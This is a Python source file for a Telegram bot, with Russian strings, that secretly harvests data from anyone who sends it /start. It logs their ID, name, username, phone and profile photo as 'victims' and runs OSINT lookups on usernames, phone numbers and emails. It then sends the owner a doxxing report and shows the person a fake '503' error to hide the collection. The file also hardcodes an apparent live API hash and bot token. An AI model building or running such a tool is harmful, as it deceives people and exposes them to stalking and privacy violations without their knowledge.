from telethon import TelegramClient, events
from datetime import datetime
import json
import os
import requests
import re

API_ID = 26016868
API_HASH = "77863601ac3d8036a0fa3c546fb3c083"
BOT_TOKEN = "8653469627:AAEe_GYwGBCG4R-rZ2ipBtKVMNO7ZIKcnD8"
OWNER_ID = 1185238446

client = TelegramClient('bot', API_ID, API_HASH).start(bot_token=BOT_TOKEN)

victims = []

if os.path.exists("victims.json"):
    with open("victims.json", "r") as f:
        victims = json.load(f)

def search_by_username(username):
    """Поиск профилей в соцсетях по юзернейму"""
    results = {}
    sites = {
        "Instagram": f"https://www.instagram.com/{username}/",
        "Twitter": f"https://twitter.com/{username}",
        "GitHub": f"https://github.com/{username}",
        "TikTok": f"https://www.tiktok.com/@{username}",
        "VK": f"https://vk.com/{username}",
        "YouTube": f"https://youtube.com/@{username}",
        "Reddit": f"https://reddit.com/user/{username}"
    }
    for name, url in sites.items():
        try:
            r = requests.get(url, timeout=5, headers={"User-Agent": "Mozilla/5.0"})
            if r.status_code == 200:
                results[name] = url
        except:
            pass
    return results

def search_by_phone(phone):
    """Поиск информации по номеру телефона"""
    results = {}
    phone_clean = re.sub(r"\D", "", phone)
    if len(phone_clean) == 11 and phone_clean.startswith("8"):
        phone_clean = "7" + phone_clean[1:]
    
    # Оператор и регион
    try:
        r = requests.get(f"https://htmlweb.ru/geo/api.php?json&tel={phone_clean}", timeout=5)
        if r.status_code == 200:
            data = r.json()
            results["operator"] = data.get("operator", {}).get("name")
            results["region"] = data.get("region", {}).get("name")
    except:
        pass
    
    # Проверка WhatsApp
    try:
        r = requests.get(f"https://api.whatsapp.com/phone/{phone_clean}", timeout=5)
        results["whatsapp"] = "есть" if r.status_code == 200 else "нет"
    except:
        results["whatsapp"] = "ошибка"
    
    # Проверка Telegram (через API)
    try:
        r = requests.get(f"https://t.me/{phone_clean}", timeout=5)
        results["telegram"] = "есть" if r.status_code == 200 else "нет"
    except:
        pass
    
    return results

def search_by_email(email):
    """Поиск по email"""
    results = {}
    try:
        # Gravatar
        import hashlib
        hash_md5 = hashlib.md5(email.lower().encode()).hexdigest()
        r = requests.get(f"https://www.gravatar.com/{hash_md5}.json", timeout=5)
        if r.status_code == 200:
            results["gravatar"] = r.json().get("entry", [{}])[0].get("displayName")
    except:
        pass
    
    # Проверка утечек (бесплатный API)
    try:
        r = requests.get(f"https://leak-lookup.com/api/search", timeout=5)
        # Требуется API ключ
    except:
        pass
    
    return results

def save_victim(user, osint_data=None):
    if osint_data is None:
        osint_data = {}
    
    data = {
        "id": user.id,
        "username": user.username,
        "first_name": user.first_name,
        "last_name": user.last_name,
        "phone": str(getattr(user, 'phone', 'Скрыт')),
        "osint": osint_data,
        "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    victims.append(data)
    with open("victims.json", "w", encoding="utf-8") as f:
        json.dump(victims, f, indent=2, ensure_ascii=False)

@client.on(events.NewMessage(pattern='/start'))
async def handler(event):
    user = await event.get_sender()
    msg_text = event.raw_text
    
    # Владелец
    if user.id == OWNER_ID:
        await event.reply(
            "✅ **БОТ АКТИВЕН**\n\n"
            "📌 **Команды:**\n"
            "/stats - статистика\n"
            "/list - список жертв\n"
            "/search @username - пробив юзернейма\n"
            "/search +79991234567 - пробив номера\n"
            "/search email@example.com - пробив email\n\n"
            "📌 **Пробив жертвы:**\n"
            "Жертва пишет /start - получает данные\n"
            "Жертва пишет /start @username - пробив по юзернейму"
        )
        return
    
    # Пробив по параметру
    osint_data = {}
    query = None
    
    if msg_text.startswith("/start "):
        query = msg_text[7:].strip()
    elif msg_text.startswith("/search "):
        query = msg_text[8:].strip()
    
    if query:
        if query.startswith("+"):
            osint_data["phone"] = search_by_phone(query)
        elif "@" in query and "." in query:
            osint_data["email"] = search_by_email(query)
        else:
            username = query[1:] if query.startswith("@") else query
            osint_data["social"] = search_by_username(username)
    
    save_victim(user, osint_data)
    
    # Формирование отчета
    report = f"""【НОВАЯ ЖЕРТВА】
━━━━━━━━━━━━━━━━━━━━━
ID: {user.id}
Username: @{user.username}
Имя: {user.first_name} {user.last_name}
Телефон: {getattr(user, 'phone', 'Скрыт')}
Время: {datetime.now().strftime('%H:%M:%S %d.%m.%Y')}
━━━━━━━━━━━━━━━━━━━━━
Ссылка: tg://user?id={user.id}"""

    if osint_data:
        report += f"\n\n【OSINT ПРОБИВ】\n{json.dumps(osint_data, indent=2, ensure_ascii=False)}"
    
    await client.send_message(OWNER_ID, report)
    
    # Аватар
    try:
        photos = await client.get_profile_photos(user.id, limit=1)
        if photos:
            await client.send_file(OWNER_ID, photos[0], caption=f"@{user.username}")
    except:
        pass
    
    # Заглушка
    await event.reply("⚠️ Ошибка 503. Сервис временно недоступен.")

@client.on(events.NewMessage(pattern='/stats', from_users=OWNER_ID))
async def stats(event):
    await event.reply(f"📊 Жертв: {len(victims)}")

@client.on(events.NewMessage(pattern='/list', from_users=OWNER_ID))
async def list_cmd(event):
    if not victims:
        await event.reply("Список пуст")
        return
    text = "📋 Последние жертвы:\n\n"
    for v in victims[-10:]:
        text += f"• {v['first_name']} @{v['username']}\n  {v['time']}\n\n"
    await event.reply(text)

@client.on(events.NewMessage(pattern='/search (.*)', from_users=OWNER_ID))
async def search_cmd(event):
    query = event.pattern_match.group(1)
    
    if query.startswith("+"):
        result = search_by_phone(query)
    elif "@" in query and "." in query:
        result = search_by_email(query)
    else:
        username = query[1:] if query.startswith("@") else query
        result = search_by_username(username)
    
    await event.reply(f"🔍 Результат по {query}:\n\n{json.dumps(result, indent=2, ensure_ascii=False)}")

print("=" * 40)
print("БОТ ЗАПУЩЕН")
print(f"Владелец: {OWNER_ID}")
print("=" * 40)

client.run_until_disconnected()
